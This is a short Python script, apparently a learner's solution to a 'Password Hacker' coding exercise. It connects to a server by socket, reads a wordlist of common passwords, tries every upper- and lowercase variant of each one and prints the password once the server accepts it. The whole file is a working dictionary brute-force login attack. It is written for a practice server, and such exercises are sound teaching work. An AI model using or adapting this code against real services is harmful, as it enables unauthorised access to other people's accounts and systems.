import socket
import argparse
import itertools


filename = "C:\\Users\\KoliaS-PC\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt"
psw_list = list(item.replace("\n", "") for item in open(filename))


argums = argparse.ArgumentParser("ip, port")
argums.add_argument("ip_address")
argums.add_argument("port")

str_arg = argums.parse_args()

psw_item = 0


def input_data_check(data):
    if data == "Connection success!":
        return True
    elif data == "Too many attempts":
        print("Too many attempts")
        return True
    return False


with socket.socket() as cli_socket:
    cli_socket.connect((str_arg.ip_address, int(str_arg.port)))

    for psw_item in psw_list:
        for first in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()]
                                                                   if letter.isalpha() else [letter]
                                                                   for letter in psw_item))):

            cli_socket.send("".join(first).encode())
            if input_data_check(cli_socket.recv(1024).decode()):
                print(first)  # print found password
                break
